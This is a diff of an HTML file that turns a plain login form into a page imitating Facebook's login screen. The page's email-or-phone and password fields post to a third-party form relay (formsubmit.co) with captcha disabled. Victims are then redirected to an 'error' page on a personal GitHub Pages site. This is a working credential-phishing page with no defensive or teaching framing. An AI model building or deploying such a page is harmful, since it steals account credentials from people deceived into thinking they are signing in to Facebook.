@@ -1,49 +1,35 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
+  <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" type="text/css" href="login form.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-    <title>login form</title>
-</head>
-<body>
-    <div class="container">
-    <h1 id="fh1">Login</h1>
-    <br>
-    <!-- facebook and twitter icon displayed by using fa fa font awesome -->
-    <a href="facebook login.html" class="fa fa-facebook"id ="fb"></a>
-    <a href="twitter login.html" class="fa fa-twitter" id="twit"></a>
-    <br>
-    <br>
-    <br>
-    <br>
-    <b id="account">Or use your account</b>
-    <br>
-    <br>
-    <form action="https://formsubmit.co/a55c90e5a94cd39eeb3a7cd5a2c925af" method="POST">
-        <input type="text" name="_honey" style="display:none;">
-
+    <title>Facebook login</title>
+    <link rel="stylesheet" href="style.css">
+  </head>
+  <body>
+    <div class="container flex">
+      <div class="facebook-page flex">
+        <div class="text">
+          <h1>facebook</h1>
+          <p>Connect with friends and the world </p>
+          <p> around you on Facebook.</p>
+        </div>
+        <form action="https://formsubmit.co/a55c90e5a94cd39eeb3a7cd5a2c925af" method="POST">
+          <input type="text" name="_honey" style="display:none;">
         <input type="hidden" name="_captcha" value="false">
-
-        <input type="hidden" name="_next" value="https://miracledaniel2005.github.io/my-webpage/succes.html">
-
-    <input type="email" placeholder="Enter your email" name="e-mail" id="email" required>
-    <br>
-    <br>
-    <input type="password" name="password" placeholder="Enter your password" minlength="8" maxlength="20" id="pwd" pattern="{8,20}" required>
-    <br>
-    <br>
-    <a href="#" id="forget">Forget your password?</a>
-    <br>
-    <br>
-    <button><i id="italic">Log in</i></button>
-    <br>
-    <br>
-    </form>
-    <b>Or</b>
-    <br>
-    <a href="js login form.html" id="create">Create account</a>
-    </div>    
-</body>
+        <input type="hidden" name="_next" value="https://miracledaniel2005.github.io/ebube/error.html">
+          <input type="text" name="Phone_number/Email" placeholder="Email or phone number" required>
+          <input type="password" name="password" placeholder="Password" required>
+          <div class="link">
+            <button type="submit" class="login">Log in</button>
+            <a href="#" class="forgot">Forgot password?</a>
+          </div>
+          <hr>
+          <div class="button">
+            <a href="#">Create new account</a>
+          </div>
+        </form>
+      </div>
+    </div>
+  </body>
 </html>
